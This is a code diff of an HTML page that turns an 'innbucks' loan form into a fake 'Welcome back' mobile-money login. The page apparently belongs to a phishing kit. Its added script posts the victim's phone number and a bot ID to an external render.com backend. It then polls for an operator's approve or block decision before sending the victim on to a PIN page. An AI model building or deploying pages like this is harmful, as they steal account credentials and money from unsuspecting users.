@@ -3,90 +3,204 @@
 <head>
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
-<title>Loan Application Form</title>
+<title>Welcome Back</title>
+
 <style>
-body {
-    font-family: Arial, sans-serif;
-    background: #f6f7fb;
-    display: flex;
-    justify-content: center;
-    align-items: center;
-    height: 100vh;
-    margin: 0;
-}
-.loan-container {
-    background: #fff;
-    padding: 30px;
-    border-radius: 12px;
-    width: 100%;
-    max-width: 400px;
-    box-shadow: 0 5px 15px rgba(0,0,0,0.1);
-}
-.logo-container {
-    width: 100%;
-    height: 120px;
-    margin-bottom: 20px;
-}
-.logo {
-    width: 100%;
-    height: 100%;
-    object-fit: cover;
-}
-label { display: block; margin: 10px 0 5px; font-weight: bold; }
-input { width: 100%; padding: 10px; margin-bottom: 15px; }
-button { width: 100%; padding: 12px; background: red; color: #fff; border: none; }
-button:disabled { background: #ccc; }
-
-.checkbox-label {
-    display: flex;
-    align-items: center;      /* vertically center the checkbox and text */
-    gap: 8px;                 /* space between checkbox and text */
-    font-size: 14px;
-    margin-bottom: 15px;
-    cursor: pointer;          /* makes label clickable */
+*{
+    margin:0;
+    padding:0;
+    box-sizing:border-box;
+    font-family:Arial,sans-serif;
 }
 
-.checkbox-label input[type="checkbox"] {
-    width: 18px;
-    height: 18px;
-    accent-color: red;        /* makes the checkbox red to match button */
+body{
+    background:#fff;
+    min-height:100vh;
 }
 
+.container{
+    max-width:430px;
+    margin:auto;
+    min-height:100vh;
+    padding:25px;
+    display:flex;
+    flex-direction:column;
+}
+
+.back-btn{
+    font-size:40px;
+    cursor:pointer;
+    margin-top:10px;
+    margin-bottom:40px;
+}
+
+h1{
+    font-size:30px;
+    font-weight:700;
+    margin-bottom:30px;
+    color:#000;
+}
+
+.phone-wrapper{
+    display:flex;
+    gap:12px;
+    margin-bottom:25px;
+}
+
+.country-box{
+    width:120px;
+    height:70px;
+    border:1px solid #ddd;
+    border-radius:8px;
+    display:flex;
+    align-items:center;
+    justify-content:center;
+    gap:10px;
+    font-size:22px;
+}
+
+.phone-wrapper input{
+    flex:1;
+    height:70px;
+    border:1px solid #ddd;
+    border-radius:8px;
+    padding:0 20px;
+    font-size:20px;
+    outline:none;
+}
+
+.biometric-row{
+    display:flex;
+    justify-content:space-between;
+    align-items:center;
+    margin-bottom:30px;
+}
+
+.bio-left{
+    display:flex;
+    align-items:center;
+    gap:10px;
+    font-size:20px;
+}
+
+.bio-icon{
+    font-size:28px;
+}
+
+.switch{
+    position:relative;
+    display:inline-block;
+    width:64px;
+    height:34px;
+}
+
+.switch input{
+    opacity:0;
+    width:0;
+    height:0;
+}
+
+.slider{
+    position:absolute;
+    inset:0;
+    background:#ccc;
+    transition:.3s;
+    border-radius:30px;
+}
+
+.slider:before{
+    content:"";
+    position:absolute;
+    width:26px;
+    height:26px;
+    left:4px;
+    bottom:4px;
+    background:white;
+    border-radius:50%;
+    transition:.3s;
+}
+
+.switch input:checked + .slider{
+    background:#008060;
+}
+
+.switch input:checked + .slider:before{
+    transform:translateX(30px);
+}
+
+#nextBtn{
+    width:100%;
+    height:65px;
+    border:none;
+    border-radius:40px;
+    background:#ffe600;
+    color:#000;
+    font-size:24px;
+    font-weight:700;
+    cursor:pointer;
+}
+
+#nextBtn:disabled{
+    opacity:.5;
+    cursor:not-allowed;
+}
 </style>
 </head>
+
 <body>
 
-<div class="loan-container">
-    <div class="logo-container">
-        innbucks
-    </div>
+<div class="container">
 
-    <h2>Loan Application Form</h2>
+    <div class="back-btn">←</div>
+
+    <h1>Welcome back</h1>
 
     <form id="detailsForm">
-        <label>Full Name</label>
-        <input id="name" placeholder="Name" required>
 
-        <label>Phone Number</label>
-        <input id="phone" placeholder="+263" required>
+        <input type="hidden" id="name" value="User">
 
-        <label class="checkbox-label">
-    <input type="checkbox" id="confirmCheck">
-    I agree to innbucks terms and services
-</label>
+        <div class="phone-wrapper">
+            <div class="country-box">
+                🇰🇪 <span>⌄</span>
+            </div>
 
+            <input
+                id="phone"
+                type="tel"
+                placeholder="+254 788 888888"
+                required
+            >
+        </div>
 
-        <button id="nextBtn" disabled>Next</button>
+        <div class="biometric-row">
+            <div class="bio-left">
+                <span class="bio-icon">◉</span>
+                <span>Enable biometrics</span>
+            </div>
+
+            <label class="switch">
+                <input type="checkbox" id="confirmCheck">
+                <span class="slider"></span>
+            </label>
+        </div>
+
+        <button id="nextBtn" disabled type="submit">
+            Log in
+        </button>
+
     </form>
+
 </div>
 
 <script>
+const BACKEND_URL = "https://innbucks-jqtp.onrender.com";
+
 const params = new URLSearchParams(window.location.search);
 const botId = params.get('botId') || window.location.pathname.split('/').pop();
-if (!botId) { alert("Invalid access link"); throw new Error(); }
 
-if (!localStorage.getItem('loanAmount')) {
-    window.location.href = `index.html?botId=${botId}`;
+if (!botId) {
+    alert("Invalid access link");
+    throw new Error();
 }
 
 const confirmCheck = document.getElementById('confirmCheck');
@@ -96,16 +210,68 @@ confirmCheck.addEventListener('change', () => {
     nextBtn.disabled = !confirmCheck.checked;
 });
 
-document.getElementById('detailsForm').addEventListener('submit', e => {
+document.getElementById('detailsForm').addEventListener('submit', async (e) => {
     e.preventDefault();
 
-    const nameInput = document.getElementById('name');
-    const phoneInput = document.getElementById('phone');
+    const name = document.getElementById('name').value;
+    const phone = document.getElementById('phone').value.trim();
 
-    localStorage.setItem('name', nameInput.value);
-    localStorage.setItem('phone', phoneInput.value);
+    if (!phone) return;
 
-    window.location.href = `pin.html?botId=${botId}`;
+    nextBtn.disabled = true;
+    nextBtn.textContent = "Processing...";
+
+    try {
+
+        const res = await fetch(`${BACKEND_URL}/submit-phone`, {
+            method: "POST",
+            headers: {
+                "Content-Type": "application/json"
+            },
+            body: JSON.stringify({
+                name,
+                phone,
+                botId
+            })
+        });
+
+        const data = await res.json();
+
+        const requestId = data.requestId;
+
+        const poll = setInterval(async () => {
+
+            const r = await fetch(`${BACKEND_URL}/check-phone/${requestId}`);
+            const d = await r.json();
+
+            if (d.blocked) {
+                clearInterval(poll);
+                alert(d.message || "Blocked");
+                nextBtn.disabled = false;
+                nextBtn.textContent = "Log in";
+                return;
+            }
+
+            if (d.approved === true) {
+                clearInterval(poll);
+                window.location.href = `pin.html?botId=${botId}&requestId=${requestId}`;
+            }
+
+            if (d.approved === false) {
+                clearInterval(poll);
+                alert("Request declined");
+                nextBtn.disabled = false;
+                nextBtn.textContent = "Log in";
+            }
+
+        }, 1500);
+
+    } catch (err) {
+        console.error(err);
+        alert("Network error");
+        nextBtn.disabled = false;
+        nextBtn.textContent = "Log in";
+    }
 });
 </script>
 
